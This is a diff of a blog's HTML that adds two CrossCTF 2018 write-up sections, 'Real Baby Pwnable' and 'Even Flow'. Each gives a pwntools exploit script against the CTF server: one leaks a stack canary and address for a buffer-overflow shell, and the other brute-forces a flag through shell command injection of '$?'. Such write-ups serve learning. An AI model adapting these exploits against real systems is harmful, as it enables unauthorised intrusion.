@@ -50,8 +50,8 @@
                     </h1>
                     <h2 class="headline">
                     May 19, 2018 13:05
-                    · 1058 words
-                    · 5 minute read
+                    · 1231 words
+                    · 6 minute read
                       <span class="tags">
                       
                       
@@ -111,6 +111,16 @@
 <ul>
 <li><a href="#problem-7">Problem</a></li>
 <li><a href="#solution-7">Solution</a></li>
+</ul></li>
+<li><a href="#real-baby-pwnable">Real Baby Pwnable</a>
+<ul>
+<li><a href="#problem-8">Problem</a></li>
+<li><a href="#solution-8">Solution</a></li>
+</ul></li>
+<li><a href="#even-flow">Even Flow</a>
+<ul>
+<li><a href="#problem-9">Problem</a></li>
+<li><a href="#solution-9">Solution</a></li>
 </ul></li>
 </ul>
 </nav>
@@ -483,6 +493,93 @@ console.log(v4.toString(16));
 </code></pre>
 
 <p>Flag: <code>crossctf{RSA_Challenges_Are_Too_Easy}</code></p>
+
+<h1 id="real-baby-pwnable">Real Baby Pwnable</h1>
+
+<h2 id="problem-8">Problem</h2>
+
+<p>This is an actual baby pwn challenge.</p>
+
+<p><a href="/blog/crossctf-2018-writeup/Real-Baby-Pwnable/realbabypwn">realbabypwn</a></p>
+
+<h2 id="solution-8">Solution</h2>
+
+<p>Code:</p>
+
+<pre><code class="language-python">from pwn import *
+
+context.log_level = 'debug'
+
+# sh = process('./realbabypwn')
+sh = remote('ctf.pwn.sg', 1500)
+
+print sh.recvuntil('? ')
+sh.sendline('289')
+canary = sh.recvuntil(') ').split('\n')[0][22:]
+canary = int(canary)
+print hex(canary)
+
+sh.sendline('y')
+print sh.recvuntil('? ')
+sh.sendline('291')
+pwn = sh.recvuntil(') ').split('\n')[0][22:]
+pwn = int(pwn)-482
+print hex(pwn)
+sh.sendline('n')
+print sh.recvuntil('? ')
+payload = 'a'*264
+payload += p64(canary)
+payload += p64(pwn)
+payload += p64(pwn)
+payload += p64(pwn)
+payload += p64(pwn)
+
+sh.send(payload.ljust(0x200, '\x90'))
+sh.interactive()
+</code></pre>
+
+<p>Notes:</p>
+
+<ul>
+<li>Have to leak the stack canary and include it in the payload</li>
+<li>Have to leak a random stack address and calculate the relative offset to the <code>babymode</code> (<code>-482</code> in this case)</li>
+</ul>
+
+<p>Flag: <code>CrossCTF{It3r4t1ve_0ver_R3curs1v3}</code></p>
+
+<h1 id="even-flow">Even Flow</h1>
+
+<h2 id="problem-9">Problem</h2>
+
+<p>Do you like shell command injection?</p>
+
+<p><a href="/blog/crossctf-2018-writeup/Even-Flow/evenflow.py">evenflow.py</a></p>
+
+<h2 id="solution-9">Solution</h2>
+
+<pre><code class="language-python">from pwn import *
+
+flag = 'CrossCTF{'
+
+while True:
+  sh = remote('ctf.pwn.sg', 1601)
+  sh.recvuntil(': ')
+  sh.sendline(flag)
+  sh.recvuntil(': ')
+  sh.sendline('$?')
+  flag += chr(int(sh.recvall().split('\n')[0]))
+  sh.close()
+  print flag
+</code></pre>
+
+<p>Notes:</p>
+
+<ul>
+<li><code>$?</code> in bash stores the return code of the last command</li>
+<li><code>strcmp</code> returns the next char code or difference</li>
+</ul>
+
+<p>Flag: <code>CrossCTF{I_just_want_someone_to_say_to_me}</code></p>
 
                 </section>
             </article>
